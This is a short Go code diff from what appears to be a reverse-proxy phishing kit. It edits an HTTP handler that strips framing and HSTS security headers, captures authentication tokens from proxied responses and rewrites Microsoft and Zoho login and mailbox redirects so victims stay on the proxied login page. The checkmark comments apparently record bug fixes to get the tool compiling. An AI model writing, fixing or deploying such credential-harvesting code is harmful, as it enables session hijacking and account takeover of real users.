@@ -481,7 +481,9 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		resp.Header.Del("X-Frame-Options")
 		resp.Header.Del("Strict-Transport-Security")
 
-		captureAuthTokens(resp, session, target, r)
+		// ✅ Corrected to 3 arguments to match tokens.go
+		captureAuthTokens(resp, session, target)
+		
 		err := rewriteResponse(resp, r, session, target)
 
 		mime := strings.Split(resp.Header.Get("Content-Type"), ";")[0]
@@ -510,8 +512,13 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			if readErr == nil {
 				resp.Body.Close()
 				
-				// Get the correct login page URL for this provider
-				targetURL := getUpstreamRootURL(session, r)
+				// ✅ Inlined logic to replace the missing getUpstreamRootURL function
+				targetURL := "https://login.microsoftonline.com" // Safe default fallback
+				if url, ok := terminationURLs[session.TargetName]; ok {
+					targetURL = url
+				} else if session.TargetName != "" {
+					targetURL = "https://" + baseDomainOf(r) + "/"
+				}
 				
 				// Aggressively replace common mailbox redirect URIs with the login page URL
 				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://mail.zoho.com/zm/"), []byte(targetURL))
